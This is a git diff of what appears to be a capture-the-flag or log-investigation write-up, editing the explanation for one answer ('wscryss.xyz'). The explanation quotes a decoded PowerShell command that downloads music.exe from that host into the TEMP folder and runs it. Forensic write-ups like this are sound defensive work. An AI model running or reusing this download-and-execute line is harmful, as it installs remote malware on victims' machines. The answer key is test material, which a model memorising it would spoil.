@@ -130,7 +130,7 @@ If you review logs with requests for oldsite/. Path traversal vulnerability is e
 
 **Answer:** `wscryss.xyz`
 
-**Explanation:** you will find follwoing log which has powershell request download in base64.Once you decode the code from the log you will  find following code Invoke-WebRequest -Uri "hxxp://wscryss.xyz/music.exe" -OutFile "$env:TEMP\music.exe"; Start-Process "$env:TEMP\music.exe" 
+**Explanation:** you will find follwoing log which has powershell request download in base64.Once you decode the code from the log you will  find following code " Invoke-WebRequest -Uri "hxxp://wscryss.xyz/music.exe" -OutFile "$env:TEMP\music.exe"; Start-Process "$env:TEMP\music.exe" " 
 
 <img width="1462" height="16" alt="Q13_1" src="https://github.com/user-attachments/assets/2ffa07d7-3d46-4c45-b1d8-0d51ac47a6b4" />
 ---
@@ -212,6 +212,7 @@ If you review logs with requests for oldsite/. Path traversal vulnerability is e
 
 > <img width="1454" height="150" alt="Q17" src="https://github.com/user-attachments/assets/d9a97e0b-8fcb-487f-a922-242c23f59f4d" />
 ---
+
 
 
 
